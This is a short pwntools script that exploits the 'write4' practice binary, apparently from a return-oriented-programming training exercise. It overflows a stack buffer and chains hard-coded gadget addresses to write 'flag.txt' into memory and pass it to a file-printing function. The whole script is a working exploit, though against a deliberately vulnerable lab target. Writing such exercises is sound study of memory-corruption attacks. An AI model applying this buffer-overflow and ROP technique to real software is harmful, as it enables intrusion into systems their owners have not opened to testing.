from pwn import *

p = process("./write4")
elf = ELF("./libwrite4.so")
lib = elf.libc
print(p.pid)
pause()
p.recvuntil("> ")

pop_r14_pop_r15_ret = 0x0000000000400690
mov_qword_ptr_r14r15_ret = 0x0000000000400628
pop_rdi_ret = 0x0000000000400693
bss_area = 0x0000000000601038

payload = b"A"*40
payload += p64(pop_r14_pop_r15_ret)
payload += p64(0x000000000601028)
payload += b"flag.txt"
payload += p64(mov_qword_ptr_r14r15_ret)
payload += p64(pop_rdi_ret)
payload += p64(0x000000000601028)
payload += p64(0x400510)
p.send(payload)

p.interactive()
